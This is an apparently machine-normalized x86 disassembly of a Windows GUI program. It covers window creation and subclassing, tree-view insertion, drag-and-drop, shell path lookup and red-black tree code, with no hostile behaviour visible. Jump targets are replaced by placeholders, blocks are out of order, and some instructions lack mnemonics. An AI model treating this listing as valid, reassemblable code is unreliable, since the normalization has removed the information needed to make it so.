mov eax [ rw-data ]
jae r-xdata
push 0x0
push 0xffffffff
push eax
call sub_425d10
mov ecx [ rw-data ]
add esp 0xc
push ecx
call [ SetFocus@IAT ]
mov eax rw-data
sub_432ba0
push ebx
push esi
mov esi [ esp + 0xc ]
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
push edi
mov edi [ esi + 0x8 ]
push 0x0
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
mov ecx [ esi ]
mov edx [ esi + 0x10 ]
push eax
mov eax [ esi + 0xc ]
push 0x65
push ecx
mov ecx [ esi + 0x14 ]
sub edx edi
push edx
mov edx [ esi + 0x18 ]
sub eax ebx
push eax
push edi
push ebx
push ecx
push r--data
push r--data
push edx
call [ CreateWindowExA@IAT ]
push sub_432b10
mov esi eax
push 0xfffffffc
push esi
call [ SetWindowLongA@IAT ]
test esi esi
mov [ rw-data ] eax
jne r-xdata
push esi
call sub_432590
add esp 0x4
pop edi
mov eax esi
pop esi
pop ebx
retn
pop edi
pop esi
xor eax eax
pop ebx
retn
sub_432c20
push 0x30
call sub_4b573e
add esp 0x4
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ eax ] 0x0
lea ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
mov [ ecx ] 0x0
mov [ eax + 0x2c ] 0x1
mov [ eax + 0x2d ] 0x0
retn
mov [ ecx ] 0x0
sub_432c60
push ecx
push esi
push edi
mov edi [ esp + 0x14 ]
push edi
mov esi ecx
call sub_4614e0
cmp eax [ esi + 0x4 ]
mov [ esp + 0x14 ] eax
je r-xdata
mov ecx [ esi + 0x4 ]
lea eax [ esp + 0x8 ]
mov [ esp + 0x8 ] ecx
mov edx [ eax ]
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] edx
pop esi
pop ecx
retn 0x8
cmp [ eax + 0x24 ] 0x10
mov ecx [ eax + 0x20 ]
jb r-xdata
add eax 0x10
mov eax [ eax + 0x10 ]
jmp r-xdata
lea eax [ esp + 0x14 ]
mov edx [ eax ]
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] edx
pop esi
pop ecx
retn 0x8
push ecx
push eax
mov eax [ edi + 0x14 ]
push eax
push 0x0
mov ecx edi
call sub_401150
test eax eax
jl r-xdata
sub_432cd0
push esi
push edi
mov edi [ esp + 0xc ]
xor eax eax
push 0xffffffff
mov esi ecx
push eax
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] eax
push edi
mov [ esi + 0x4 ] al
call sub_401dd0
mov eax [ edi + 0x1c ]
mov [ esi + 0x1c ] eax
pop edi
mov eax esi
pop esi
retn 0x4
sub_432d00
push 0xffffffff
push sub_4bffa8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push ebx
push ebp
push esi
mov esi [ esp + 0x60 ]
xor ebx ebx
mov eax esi
xor ebp ebp
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] ebx
mov [ esp + 0x38 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ esp + 0x3c ]
call sub_401e80
push esi
mov [ esp + 0x5c ] ebx
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov [ esp + 0x64 ] ebx
lea eax [ esp + 0x34 ]
push eax
push esi
call sub_457f40
add eax esi
add esp 0x4
push eax
call sub_404790
add esp 0x8
jmp r-xdata
cmp [ esp + 0x4c ] 0x10
pop esi
pop ebp
pop ebx
jb r-xdata
mov [ esi ] r--data
mov [ esi + 0x4 ] 0x1
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] ebx
push 0x2
mov ecx esi
mov [ esi + 0x10 ] ebx
call sub_42b8f0
test eax eax
je r-xdata
push 0x14
call sub_4b573e
mov esi eax
add esp 0x4
cmp esi ebx
je r-xdata
mov ecx [ esp + 0x44 ]
mov [ fs : 0x0 ] ecx
add esp 0x50
retn
mov eax [ esp + 0x2c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov edx [ esi ]
push esi
call [ edx + 0x8 ]
cmp ebp ebx
je r-xdata
mov eax [ esp + 0x4c ]
push edi
mov edi 0x10
cmp eax edi
mov eax [ esp + 0x3c ]
jae r-xdata
push ebp
call [ GlobalFree@IAT ]
push eax
call sub_432690
mov ebp eax
add esp 0x4
cmp ebp ebx
je r-xdata
lea eax [ esp + 0x3c ]
pop edi
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x28 ]
push edx
push ebp
push 0x1
call sub_432800
mov eax [ esi ]
add esp 0x10
push 0x1
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x2c ]
push edx
push esi
call [ eax + 0x1c ]
test eax eax
jne r-xdata
cmp [ esp + 0x50 ] edi
jb r-xdata
lea ecx [ esp + 0x3c ]
mov [ esp + 0x10 ] ecx
mov eax [ esp + 0x3c ]
mov [ esp + 0x10 ] eax
jmp r-xdata
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x28 ]
push ecx
push ebp
push 0xf
call sub_432800
mov edx [ esi ]
add esp 0x10
push 0x1
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x2c ]
push ecx
push esi
call [ edx + 0x1c ]
test eax eax
jne r-xdata
push ebx
lea edx [ esp + 0x14 ]
push 0x1
push edx
call sub_4326d0
mov ebp eax
add esp 0xc
cmp ebp ebx
je r-xdata
push 0xc
xor ebp ebp
call sub_4b573e
mov edi eax
add esp 0x4
cmp edi ebx
je r-xdata
mov edx [ esp + 0x68 ]
lea eax [ esp + 0x14 ]
push eax
push 0x1
push edi
mov [ edi ] r--data
mov [ edi + 0x8 ] 0x1
push esi
mov [ edi + 0x4 ] edx
call [ DoDragDrop@IAT ]
mov ecx [ edi ]
push edi
call [ ecx + 0x8 ]
sub_432ee0
push 0xffffffff
push sub_4bffc8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x50
push esi
push edi
mov edi [ esp + 0x6c ]
mov al [ edi + 0x2d ]
test al al
mov [ esp + 0xc ] ecx
je r-xdata
push ebx
mov ebx edi
push ebp
lea ecx [ esp + 0x74 ]
mov [ esp + 0x18 ] ebx
call sub_432ab0
mov ebp [ edi ]
mov al [ ebp + 0x2d ]
test al al
lea eax [ edi + 0x8 ]
jne r-xdata
xor esi esi
mov eax r--data
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] esi
mov [ esp + 0x18 ] 0x0
lea edx [ eax + 0x1 ]
mov ebp [ eax ]
mov edx [ eax ]
mov cl [ edx + 0x2d ]
test cl cl
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x1c ]
call sub_401e80
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x34 ]
mov [ esp + 0x64 ] esi
call sub_402340
push r--data
lea ecx [ esp + 0x34 ]
push ecx
mov [ esp + 0x38 ] r--data
call sub_4b5bd2
mov ecx [ ebx ]
mov [ ecx + 0x4 ] edi
mov edx [ ebx ]
mov [ edi ] edx
cmp edi [ ebx + 0x8 ]
jne r-xdata
mov al [ ebp + 0x2d ]
test al al
mov esi [ ebx + 0x4 ]
jne r-xdata
cmp edi ebx
jne r-xdata
mov eax [ esp + 0x74 ]
mov edi eax
add eax 0x8
mov cl [ ebp + 0x2d ]
test cl cl
mov esi [ edi + 0x4 ]
jne r-xdata
mov esi edi
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ ebp + 0x4 ] esi
mov [ esi ] ebp
mov ecx [ ebx + 0x8 ]
mov [ eax ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] edi
mov [ ebp + 0x4 ] esi
mov eax [ esp + 0x14 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] ebp
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi + 0x8 ] ebp
mov [ esi ] ebp
jmp r-xdata
mov edi [ ecx + 0x4 ]
cmp [ edi ] ebx
jne r-xdata
mov [ eax + 0x8 ] edi
mov [ eax ] edi
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov [ edi + 0x4 ] ecx
mov dl [ ebx + 0x2c ]
mov al [ edi + 0x2c ]
mov [ edi + 0x2c ] dl
mov [ ebx + 0x2c ] al
mov edi [ ecx + 0x4 ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
mov al [ ebp + 0x2d ]
test al al
je r-xdata
mov esi [ esp + 0x18 ]
mov eax [ esi + 0x24 ]
add esi 0xc
cmp eax 0x10
pop ebp
pop ebx
jb r-xdata
mov ecx [ edi + 0x4 ]
cmp ebp [ ecx + 0x4 ]
je r-xdata
mov eax [ esp + 0x18 ]
mov cl [ eax + 0x2c ]
mov edi [ esp + 0x14 ]
mov bl 0x1
cmp cl bl
jne r-xdata
mov al [ ebp + 0x2d ]
test al al
je r-xdata
push ebp
call sub_432860
mov ecx [ esp + 0x18 ]
add esp 0x4
mov eax esi
jmp r-xdata
lea eax [ esp + 0xb ]
push eax
mov ecx esi
mov [ esi + 0x18 ] 0xf
mov [ esp + 0xf ] 0x0
mov [ esi + 0x14 ] 0x0
call sub_4010a0
push eax
call sub_401010
mov ecx [ esp + 0x18 ]
push ecx
call j_sub_4b66ed#2
mov eax [ edi + 0x8 ]
add esp 0xc
test eax eax
jbe r-xdata
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ ebp + 0x2c ] bl
cmp [ ebp + 0x2c ] bl
jne r-xdata
push ebp
call sub_432840
add esp 0x4
mov [ edi + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ edi + 0x8 ] eax
jmp r-xdata
mov [ edi ] eax
mov eax [ esp + 0x68 ]
mov edx [ esp + 0x6c ]
mov ecx [ esp + 0x58 ]
pop edi
mov [ eax ] edx
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x5c
retn 0x8
dec eax
mov [ edi + 0x8 ] eax
mov eax [ esi ]
cmp ebp eax
jne r-xdata
mov cl [ eax + 0x2c ]
test cl cl
jne r-xdata
mov eax [ esi + 0x8 ]
mov cl [ eax + 0x2c ]
test cl cl
jne r-xdata
mov cl [ eax + 0x2d ]
test cl cl
jne r-xdata
mov [ eax + 0x2c ] bl
push esi
mov ecx edi
mov [ esi + 0x2c ] 0x0
call sub_40b000
mov eax [ esi ]
mov cl [ eax + 0x2d ]
test cl cl
jne r-xdata
mov [ eax + 0x2c ] bl
push esi
mov ecx edi
mov [ esi + 0x2c ] 0x0
call sub_40afa0
mov eax [ esi + 0x8 ]
mov edx [ edi + 0x4 ]
mov eax [ edx + 0x4 ]
mov ebp esi
cmp ebp eax
mov esi [ esi + 0x4 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x2c ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x2c ] bl
jne r-xdata
jmp r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x2c ] bl
jne r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x2c ] bl
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x2c ] bl
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x2c ] bl
je r-xdata
mov cl [ esi + 0x2c ]
mov [ eax + 0x2c ] cl
mov [ esi + 0x2c ] bl
mov edx [ eax ]
push esi
mov ecx edi
mov [ edx + 0x2c ] bl
call sub_40b000
mov edx [ eax + 0x8 ]
mov [ edx + 0x2c ] bl
push eax
mov ecx edi
mov [ eax + 0x2c ] 0x0
call sub_40afa0
mov eax [ esi ]
mov [ eax + 0x2c ] 0x0
mov cl [ esi + 0x2c ]
mov [ eax + 0x2c ] cl
mov [ esi + 0x2c ] bl
mov edx [ eax + 0x8 ]
push esi
mov ecx edi
mov [ edx + 0x2c ] bl
call sub_40afa0
jmp r-xdata
mov edx [ eax ]
mov [ edx + 0x2c ] bl
push eax
mov ecx edi
mov [ eax + 0x2c ] 0x0
call sub_40b000
mov eax [ esi + 0x8 ]
sub_4331f0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0xc ]
push ebp
mov ebp [ esp + 0x14 ]
push esi
push edi
mov esi ecx
mov ecx [ esp + 0x14 ]
push 0xffffffff
mov [ esi + 0x4 ] ecx
lea edi [ esi + 0xc ]
mov [ esi ] eax
mov [ esi + 0x8 ] edx
push 0x0
mov [ edi + 0x18 ] 0xf
mov [ edi + 0x14 ] 0x0
push ebp
mov ecx edi
mov [ edi + 0x4 ] 0x0
call sub_401dd0
mov eax [ ebp + 0x1c ]
mov cl [ esp + 0x20 ]
mov [ edi + 0x1c ] eax
pop edi
mov [ esi + 0x2c ] cl
mov [ esi + 0x2d ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x14
sub_433250
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x2d ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_433250
mov esi [ esi ]
mov ecx edi
call sub_4480b0
push edi
call j_sub_4b66ed#2
mov al [ esi + 0x2d ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_433290
sub esp 0x26c
push ebp
mov ebp [ esp + 0x284 ]
mov eax [ ebp ]
push esi
push edi
lea ecx [ esp + 0xc ]
push ecx
lea edx [ esp + 0x28c ]
push edx
push 0x1
push ebp
mov [ esp + 0x1c ] 0x60030177
call [ eax + 0x24 ]
test [ esp + 0xc ] 0x20000000
mov [ esp + 0x10 ] 0x27
je r-xdata
mov esi [ esp + 0x298 ]
mov eax [ esi ]
push 0x14
push esi
call [ eax + 0xc ]
mov edi eax
test edi edi
je r-xdata
mov [ esp + 0x30 ] 0x1
mov [ esp + 0x10 ] 0x67
mov eax [ esp + 0x294 ]
pop edi
pop esi
pop ebp
add esp 0x26c
retn
mov edx [ esp + 0x288 ]
lea ecx [ esp + 0x70 ]
push ecx
push 0x0
push edx
push ebp
call sub_4443d0
add esp 0x10
test eax eax
je r-xdata
mov eax [ esi ]
push edi
push esi
call [ eax + 0x14 ]
sub esp 0x1c
mov ecx esp
mov ebp 0xf
lea eax [ esp + 0x8c ]
mov [ ecx + 0x18 ] ebp
mov [ ecx + 0x14 ] 0x0
mov [ esp + 0x54 ] esp
mov [ ecx + 0x4 ] 0x0
lea esi [ eax + 0x1 ]
nop
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
push eax
lea eax [ esp + 0x90 ]
push eax
call sub_401e80
call sub_401530
mov esi eax
add esp 0x1c
test esi esi
je r-xdata
mov esi [ esp + 0x29c ]
test esi esi
je r-xdata
cmp esi 0x6
je r-xdata
mov [ edi + 0x10 ] 0x0
push 0x70
call sub_4b573e
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
cmp esi 0x7
je r-xdata
test eax 0x10000
je r-xdata
or [ esp + 0x10 ] edx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x18 ] 0x100
xor eax eax
mov [ eax + 0x18 ] ebp
mov [ eax + 0x14 ] ecx
mov [ eax + 0x4 ] cl
mov [ eax + 0x6c ] ebp
mov [ eax + 0x68 ] ecx
mov [ eax + 0x58 ] cl
jmp r-xdata
mov eax [ esp + 0x10 ]
or eax 0x40
push 0x70
mov [ esp + 0x34 ] 0x1
mov [ esp + 0x14 ] eax
call sub_4b573e
add esp 0x4
test eax eax
je r-xdata
mov eax [ esp + 0x284 ]
test eax eax
mov eax [ esp + 0x28c ]
jne r-xdata
or [ esp + 0x10 ] edx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x18 ] 0x200
mov ecx [ esp + 0xc ]
mov [ edi + 0xc ] ecx
mov eax [ esp + 0x288 ]
mov ecx [ esp + 0x284 ]
push eax
lea edx [ esp + 0x74 ]
push ecx
mov [ esp + 0x28 ] edx
mov [ esp + 0x2c ] 0x104
call sub_444280
mov edx [ esp + 0x290 ]
mov ebp eax
mov eax [ esp + 0x2a0 ]
push edx
push eax
call sub_4442e0
mov [ edi + 0x4 ] eax
add esp 0x10
xor eax eax
lea esi [ esp + 0x10 ]
mov ecx ebp
call sub_4325f0
mov eax [ esp + 0xc ]
test eax 0x20000
mov edx 0x8
mov ecx 0xf00
je r-xdata
mov eax [ edi + 0x10 ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
push 0xffffffff
push ecx
push esi
mov ecx eax
mov [ edi + 0x10 ] eax
call sub_401dd0
mov ecx [ edi + 0x10 ]
mov [ ecx + 0x1c ] 0x0
test [ esp + 0xc ] 0x20000000
jne r-xdata
xor eax eax
mov ecx eax
call sub_401510
jmp r-xdata
mov ecx [ esp + 0x288 ]
mov edx [ eax ]
push edi
push r--data
push 0x0
push ecx
push eax
call [ edx + 0x14 ]
mov [ edi ] eax
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov edx [ esp + 0x284 ]
lea ecx [ esp + 0x174 ]
push ecx
push edx
call [ SHGetPathFromIDListA@IAT ]
mov ecx [ edi + 0x10 ]
lea eax [ esp + 0x174 ]
push eax
call sub_402510
mov ecx [ edi + 0x10 ]
push 0xffffffff
push 0x0
push eax
call sub_401dd0
jmp r-xdata
mov [ edi + 0x10 ] eax
mov eax [ esp + 0x29c ]
test eax eax
mov [ esp + 0xc ] 0x24000000
je r-xdata
mov edx [ esp + 0x294 ]
mov eax [ esp + 0x290 ]
mov [ edi + 0x8 ] ebp
mov [ esp + 0x34 ] edi
mov ecx 0xa
lea esi [ esp + 0x10 ]
lea edi [ esp + 0x44 ]
[ edi ] [ esi ]
lea ecx [ esp + 0x3c ]
push ecx
push 0x0
mov [ esp + 0x48 ] edx
mov edx [ esp + 0x284 ]
push 0x1100
push edx
mov [ esp + 0x4c ] eax
call [ SendMessageA@IAT ]
pop edi
pop esi
pop ebp
add esp 0x26c
retn
mov ecx [ edi + 0x10 ]
lea edx [ esp + 0x70 ]
push edx
call sub_402010
mov al [ esp + 0x70 ]
test al al
lea ecx [ esp + 0x70 ]
lea esi [ esp + 0x70 ]
je r-xdata
mov ecx [ edi + 0x10 ]
push 0x5c
push 0x1
call sub_4017f0
push eax
call sub_457f00
add esp 0x4
test eax eax
jle r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov eax [ edi + 0x10 ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
lea esp [ esp ]
lea ecx [ esp + 0x70 ]
push ecx
mov ecx [ edi + 0x10 ]
call sub_402010
mov edx [ edi + 0x10 ]
mov [ edx + 0x40 ] esi
mov eax [ edi + 0x10 ]
mov [ eax + 0x1c ] 0x0
mov al [ esp + 0x70 ]
test al al
lea ecx [ esp + 0x70 ]
lea esi [ esp + 0x70 ]
je r-xdata
mov ecx [ edi + 0x10 ]
push 0x5c
push 0x1
call sub_4017f0
push eax
call sub_457f00
add esp 0x4
test eax eax
jle r-xdata
cmp al 0x2f
je r-xdata
inc ecx
jmp r-xdata
lea ecx [ ecx ]
lea esi [ ecx + 0x1 ]
cmp al 0x5c
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
test al al
jne r-xdata
cmp al 0x2f
je r-xdata
inc ecx
jmp r-xdata
mov al [ ecx ]
mov dl al
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
lea eax [ esp + 0x70 ]
cmp esi eax
je r-xdata
lea esi [ ecx + 0x1 ]
cmp al 0x5c
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
test al al
jne r-xdata
push esi
mov esi [ lstrcpyA@IAT ]
lea ecx [ esp + 0x178 ]
push ecx
call esi
lea edx [ esp + 0x174 ]
push edx
lea eax [ esp + 0x74 ]
push eax
call esi
jmp r-xdata
mov al [ ecx ]
mov dl al
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
jmp r-xdata
sub_4336b0
push ebp
mov ebp esp
push 0xffffffff
push sub_4bfff1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x30
call sub_4b573e
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] esi
test esi esi
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push eax
push ecx
mov ecx esi
call sub_4331f0
sub_433740
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bffc8
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push esi
push edi
mov edi ecx
cmp [ edi + 0x8 ] 0x7fffffe
jb r-xdata
mov edx [ esp + 0x68 ]
mov eax [ edi + 0x4 ]
mov esi [ esp + 0x64 ]
push ebx
push 0x0
push edx
push eax
push esi
push eax
mov ecx edi
call sub_4336b0
mov ebx [ edi + 0x8 ]
mov ecx eax
mov eax [ edi + 0x4 ]
inc ebx
cmp esi eax
mov [ esp + 0x6c ] ecx
mov [ edi + 0x8 ] ebx
jne r-xdata
xor esi esi
mov eax r--data
mov [ esp + 0x20 ] 0xf
mov [ esp + 0x1c ] esi
mov [ esp + 0xc ] 0x0
lea edx [ eax + 0x1 ]
mov al [ esp + 0x64 ]
test al al
je r-xdata
mov [ eax + 0x4 ] ecx
mov eax [ edi + 0x4 ]
mov [ eax ] ecx
mov edx [ edi + 0x4 ]
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x10 ]
call sub_401e80
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x58 ] esi
call sub_402340
push r--data
lea ecx [ esp + 0x28 ]
push ecx
mov [ esp + 0x2c ] r--data
call sub_4b5bd2
mov [ esi + 0x8 ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov [ esi ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x2c ] 0x0
lea eax [ ecx + 0x4 ]
mov esi ecx
mov bl 0x1
jne r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
jmp r-xdata
mov edx [ edi + 0x4 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x2c ] bl
mov eax [ esp + 0x60 ]
pop ebx
mov [ eax ] ecx
mov ecx [ esp + 0x4c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x10
push ebp
cmp [ edx + 0x2c ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x2c ] 0x0
jne r-xdata
cmp esi [ ecx ]
jne r-xdata
mov [ ecx + 0x2c ] bl
mov [ edx + 0x2c ] bl
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x2c ] 0x0
mov eax [ eax ]
mov esi [ eax + 0x4 ]
jmp r-xdata
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x2c ] bl
mov [ edx + 0x2c ] bl
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x2c ] 0x0
mov eax [ eax ]
mov esi [ eax + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x2c ] bl
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x2c ] 0x0
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx edi
call sub_40afa0
mov esi ecx
push esi
mov ecx edi
call sub_40b000
mov ecx [ esi + 0x4 ]
mov dl [ ecx + 0x2c ]
test dl dl
lea eax [ esi + 0x4 ]
je r-xdata
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x2c ] bl
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x2c ] 0x0
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx edi
call sub_40b000
jmp r-xdata
mov esi ecx
push esi
mov ecx edi
call sub_40afa0
mov ecx [ eax ]
mov ebp [ ecx + 0x4 ]
mov edx [ ebp ]
cmp ecx edx
jne r-xdata
mov ecx [ esp + 0x70 ]
pop ebp
sub_433920
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
cmp esi ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
retn 0xc
mov al [ esi + 0x2d ]
test al al
mov ecx esi
jne r-xdata
mov eax [ eax + 0x4 ]
push eax
mov ecx edi
call sub_433250
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ edi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ edi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
push ecx
lea eax [ esp + 0x18 ]
push eax
mov ecx edi
call sub_432ee0
cmp esi ebx
jne r-xdata
mov eax [ esi + 0x8 ]
mov dl [ eax + 0x2d ]
test dl dl
jne r-xdata
mov eax [ esi + 0x4 ]
mov dl [ eax + 0x2d ]
test dl dl
jne r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x2d ]
test dl dl
jne r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
mov edi edi
mov esi eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x2d ]
test dl dl
je r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x2d ]
test dl dl
je r-xdata
jmp r-xdata
sub_4339e0
sub esp 0x10
push ebx
push ebp
mov ebp ecx
mov eax [ ebp + 0x4 ]
mov edx [ eax + 0x4 ]
mov cl [ edx + 0x2d ]
test cl cl
push esi
mov ebx eax
mov al 0x1
push edi
mov edi [ esp + 0x28 ]
mov [ esp + 0x1c ] ebp
mov [ esp + 0x14 ] al
jne r-xdata
test al al
mov esi ebx
mov [ esp + 0x28 ] esi
je r-xdata
mov esi [ edi + 0x14 ]
mov [ esp + 0x10 ] esi
cmp [ edi + 0x18 ] 0x10
mov edx [ edi + 0x14 ]
lea ecx [ esi + 0xc ]
jb r-xdata
mov eax [ ebp + 0x4 ]
cmp ebx [ eax ]
jne r-xdata
lea eax [ edx + 0x10 ]
mov eax [ edx + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
lea ecx [ esp + 0x28 ]
call sub_432a50
mov esi [ esp + 0x28 ]
push edi
push ebx
push 0x1
lea eax [ esp + 0x34 ]
push eax
mov ecx ebp
call sub_433740
mov ecx [ eax ]
mov eax [ esp + 0x24 ]
pop edi
pop esi
pop ebp
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebx
add esp 0x10
retn 0x8
test ebp ebp
je r-xdata
mov ebp esi
cmp esi ebp
jae r-xdata
mov eax [ esp + 0x24 ]
pop edi
mov [ eax ] esi
pop esi
pop ebp
mov [ eax + 0x4 ] 0x0
pop ebx
add esp 0x10
retn 0x8
mov eax [ esp + 0x14 ]
push edi
push ebx
push eax
lea ecx [ esp + 0x34 ]
push ecx
mov ecx ebp
call sub_433740
mov edx [ eax ]
mov eax [ esp + 0x24 ]
pop edi
pop esi
pop ebp
mov [ eax ] edx
mov [ eax + 0x4 ] 0x1
pop ebx
add esp 0x10
retn 0x8
push edx
mov edx [ ecx + 0x14 ]
push eax
push edx
push 0x0
call sub_401150
test eax eax
jge r-xdata
cmp ebp ebx
jae r-xdata
cmp ebp ebx
mov ecx ebp
jb r-xdata
xor eax eax
cmp ebp ebx
setne al
or eax 0xffffffff
jmp r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
mov ecx ebx
mov edx [ edx + 0x8 ]
mov edx [ edx ]
jmp r-xdata
test eax eax
lea esi [ edi + 0x4 ]
mov esi [ edi + 0x4 ]
jmp r-xdata
cmp [ edx + 0x24 ] 0x10
mov ebx [ edx + 0x20 ]
mov [ esp + 0x18 ] edx
jb r-xdata
mov ebx [ esp + 0x18 ]
mov ebp [ esp + 0x1c ]
mov cl [ edx + 0x2d ]
test cl cl
je r-xdata
test eax eax
mov esi [ esp + 0x10 ]
mov edi [ esp + 0x28 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov edi eax
xor eax eax
[ esi ] [ edi ]
je r-xdata
setl al
test al al
mov [ esp + 0x14 ] al
je r-xdata
sub_433b40
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
